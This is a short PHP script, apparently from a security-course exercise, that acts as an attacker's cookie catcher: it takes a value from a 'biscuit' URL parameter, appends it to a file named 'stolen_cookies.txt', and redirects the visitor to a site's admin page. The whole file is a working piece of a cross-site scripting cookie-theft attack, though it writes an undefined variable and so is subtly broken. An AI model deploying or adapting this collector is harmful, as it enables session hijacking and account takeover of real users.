<?php

// Get them cookies
if (isset($_GET['biscuit'])) {
	
   	$value = $_GET['biscuit'];

	// Save the value to a file
	$fp = fopen("stolen_cookies.txt", "a");
	fwrite($fp, $cookie . "\t");
	fclose($fp);
}

	// admin begone
	header("Location: http://sloppy-clowns-0.csec.chatzi.org/modules/admin/");

?>

